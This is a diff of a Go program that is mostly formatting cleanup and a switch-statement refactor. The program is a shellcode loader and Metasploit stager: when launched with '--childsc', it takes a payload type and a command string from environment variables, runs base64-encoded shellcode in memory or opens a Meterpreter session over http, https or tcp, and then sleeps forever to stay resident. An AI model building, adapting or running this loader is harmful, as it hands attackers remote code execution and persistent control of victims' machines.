@@ -1,27 +1,26 @@
-
 package main
 
 import (
-	"os"
 	"log"
+	"os"
 	"runtime"
 	"time"
 
-	"github.com/kost/gosc/shell"
 	"github.com/kost/gosc/msf"
+	"github.com/kost/gosc/shell"
 )
 
-func sleepForever () {
-        for {
-                time.Sleep(time.Second)
-        }
+func sleepForever() {
+	for {
+		time.Sleep(time.Second)
+	}
 }
 
-func SCEnvAndExecute () {
-	if len(os.Args)!=2 {
+func SCEnvAndExecute() {
+	if len(os.Args) != 2 {
 		return
 	}
-	if os.Args[1]!="--childsc" {
+	if os.Args[1] != "--childsc" {
 		return
 	}
 	ptype, ok := os.LookupEnv("T2W_CMD")
@@ -33,23 +32,24 @@ func SCEnvAndExecute () {
 		return
 	}
 	log.Printf("childsc: %s %s", ptype, cmdstr)
+	executed := true
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
-	if ptype == "sc" {
+	switch ptype {
+	case "sc":
 		shell.ExecShellcode_b64(cmdstr)
-	}
-	if ptype == "msf-http" {
-		 msf.Meterpreter("http", cmdstr)
-	}
-	if ptype == "msf-https" {
-		 msf.Meterpreter("https", cmdstr)
-	}
-	if ptype == "msf-tcp" {
-		 msf.Meterpreter("tcp", cmdstr)
+	case "msf-http":
+		msf.Meterpreter("http", cmdstr)
+	case "msf-https":
+		msf.Meterpreter("https", cmdstr)
+	case "msf-tcp":
+		msf.Meterpreter("tcp", cmdstr)
+	default:
+		executed = false
 	}
 
-	sleepForever()
+	if executed {
+		sleepForever()
+	}
 	os.Exit(0)
 }
-
-
